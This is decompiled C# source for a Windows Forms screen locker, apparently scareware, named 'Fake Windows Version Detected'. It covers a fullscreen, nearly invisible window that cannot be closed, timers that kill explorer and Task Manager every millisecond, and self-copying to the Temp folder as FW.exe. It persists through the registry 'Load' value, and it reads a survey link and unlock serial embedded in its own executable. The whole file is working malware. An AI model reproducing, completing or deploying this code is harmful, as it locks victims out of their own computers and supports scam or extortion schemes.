using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Windows.Forms;
using Fake_Windows_Version_Detected.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Fake_Windows_Version_Detected;

[DesignerGenerated]
public class Lock : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Verkenner")]
	private Timer _Verkenner;

	[AccessedThroughProperty("taskmgr")]
	private Timer _taskmgr;

	[AccessedThroughProperty("Taskmgr2")]
	private Timer _Taskmgr2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	private string[] options;

	private string surveylink;

	private string serial;

	private const string filesplit = "Eminem";

	private string path;

	private string destination;

	internal virtual Timer Verkenner
	{
		[DebuggerNonUserCode]
		get
		{
			return _Verkenner;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Verkenner != null)
			{
				_Verkenner.remove_Tick(eventHandler);
			}
			_Verkenner = value;
			if (_Verkenner != null)
			{
				_Verkenner.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer taskmgr
	{
		[DebuggerNonUserCode]
		get
		{
			return _taskmgr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_taskmgr != null)
			{
				_taskmgr.remove_Tick(eventHandler);
			}
			_taskmgr = value;
			if (_taskmgr != null)
			{
				_taskmgr.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Taskmgr2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Taskmgr2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick_1;
			if (_Taskmgr2 != null)
			{
				_Taskmgr2.remove_Tick(eventHandler);
			}
			_Taskmgr2 = value;
			if (_Taskmgr2 != null)
			{
				_Taskmgr2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	public Lock()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Lock_FormClosing));
		((Form)this).add_Load((EventHandler)Lock_Load);
		__ENCAddToList(this);
		path = Application.get_ExecutablePath();
		destination = "C:\\Users\\" + GetUserName() + "\\AppData\\Local\\Temp\\FW.exe";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		components = new Container();
		Verkenner = new Timer(components);
		taskmgr = new Timer(components);
		Taskmgr2 = new Timer(components);
		Label1 = new Label();
		Label2 = new Label();
		((Control)this).SuspendLayout();
		Verkenner.set_Interval(1);
		taskmgr.set_Interval(1);
		Taskmgr2.set_Interval(1);
		Label1.set_AutoSize(true);
		Label label = Label1;
		Point location = new Point(48, 25);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(81, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("http://google.nl");
		((Control)Label1).set_Visible(false);
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(48, 52);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(139, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("0000-0000-0000-0000-0000");
		((Control)Label2).set_Visible(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.White);
		size = new Size(284, 261);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Lock");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public string GetUserName()
	{
		if (MyProject.User.get_CurrentPrincipal() is WindowsPrincipal)
		{
			string[] array = Strings.Split(MyProject.User.get_Name(), "\\", -1, (CompareMethod)0);
			return array[1];
		}
		return MyProject.User.get_Name();
	}

	private object StartUp(string win32_registry, string win32_value, string winapp32x64)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 60:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
				Registry.CurrentUser.OpenSubKey(win32_registry, writable: true)!.SetValue(win32_value, winapp32x64);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 60;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public void killprocess(ref string strProcessToKill)
	{
		Process[] processes = Process.GetProcesses();
		int upperBound = processes.GetUpperBound(0);
		for (int i = 0; i <= upperBound; i = checked(i + 1))
		{
			if (Operators.CompareString(processes[i].ProcessName, strProcessToKill, false) == 0)
			{
				processes[i].Kill();
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			string strProcessToKill = "explorer";
			killprocess(ref strProcessToKill);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Verkenner.Start();
		taskmgr.Start();
		Taskmgr2.Start();
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		Verkenner.Stop();
		taskmgr.Stop();
		Taskmgr2.Stop();
		Process.Start("C:\\Windows\\explorer.exe");
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			string strProcessToKill = "taskmgr";
			killprocess(ref strProcessToKill);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick_1(object sender, EventArgs e)
	{
		try
		{
			string strProcessToKill = "Taskmgr";
			killprocess(ref strProcessToKill);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Lock_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Lock_Load(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
				surveylink = Strings.Space((int)FileSystem.LOF(1));
				serial = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref surveylink, -1L, false);
				FileSystem.FileGet(1, ref serial, -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				options = Strings.Split(surveylink, "Eminem", -1, (CompareMethod)0);
				Label1.set_Text(options[1]);
				Label2.set_Text(options[2]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
			try
			{
				if (!Directory.Exists("C:\\Users\\" + GetUserName() + "\\AppData\\Local\\Temp"))
				{
					Directory.CreateDirectory("C:\\Users\\" + GetUserName() + "\\AppData\\Local\\Temp");
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(Application.get_ExecutablePath(), "C:\\Users\\" + GetUserName() + "\\AppData\\Local\\Temp\\FW.exe", false) == 0)
			{
				((Control)MyProject.Forms.Message).Show();
			}
			else
			{
				try
				{
					File.Delete("C:\\Users\\" + GetUserName() + "\\AppData\\Local\\Temp\\FW.exe");
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				try
				{
					File.Copy(path, destination);
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				try
				{
					Process.Start("C:\\Users\\" + GetUserName() + "\\AppData\\Local\\Temp\\FW.exe");
					ProjectData.EndApp();
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				StartUp("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "Load", "C:\\Users\\" + GetUserName() + "\\AppData\\Local\\Temp\\FW.exe");
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Button1_Click_1(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}
}
